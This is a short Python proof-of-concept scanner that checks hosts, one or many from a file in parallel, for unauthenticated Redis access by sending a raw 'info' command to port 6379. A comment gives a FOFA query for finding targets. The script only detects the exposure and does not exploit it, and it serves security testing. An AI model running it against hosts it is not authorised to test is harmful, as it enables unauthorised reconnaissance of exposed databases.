#FOFA: port="6379"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time
import socket

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '1/5.x 未授权访问漏洞',
        'vulnerable': False
    }
    oH = urlparse(target)
    a = oH.netloc.split(':')
    port = 6379
    host = a[0]
    if target:
        payload = b'*1\r\n$4\r\ninfo\r\n'
        s = socket.socket()
        socket.setdefaulttimeout(3)
        try:
            s.connect((host, int(port)))
            s.send(payload)
            response = s.recv(1024).decode()
            s.close()
            if response and 'redis_version' in response:
                result['vulnerable'] = True
                result['url'] = target
                result['port'] = port
                print(result)
        except:
            print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("1/5.x 未授权访问漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()